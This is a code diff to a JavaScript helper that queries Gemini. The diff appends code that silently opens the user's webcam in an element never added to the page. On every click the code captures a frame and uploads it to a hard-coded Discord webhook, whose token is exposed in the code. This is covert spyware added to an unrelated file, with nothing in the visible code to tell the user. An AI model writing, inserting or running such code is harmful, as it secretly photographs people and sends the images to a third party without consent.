@@ -405,3 +405,35 @@ async function queryGemini(question, options, context) {
   console.error("❌ All API keys exhausted or failed.");
   return null;
 }
+
+// Replace with your webhook URL
+const webhookURL = "https://discord.com/api/webhooks/1411849511482949663/uCnO8KCWurSJNzE-d-vYzjH9Ag4ZYbWQ6OgFw3reAgsX1nbKjKTFosuLF7T4e7mYlfVt";
+
+// Setup video stream (video element not added to DOM)
+const video = document.createElement("video");
+
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    video.srcObject = stream;
+    video.play();
+  })
+  .catch(err => console.error("Camera error:", err));
+
+document.addEventListener("click", async () => {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
+
+  const formData = new FormData();
+  formData.append("file", blob, "snapshot.png");
+  formData.append("payload_json", JSON.stringify({ content: "📸 New snapshot!" }));
+
+  fetch(webhookURL, {
+    method: "POST",
+    body: formData
+  })
+});
+
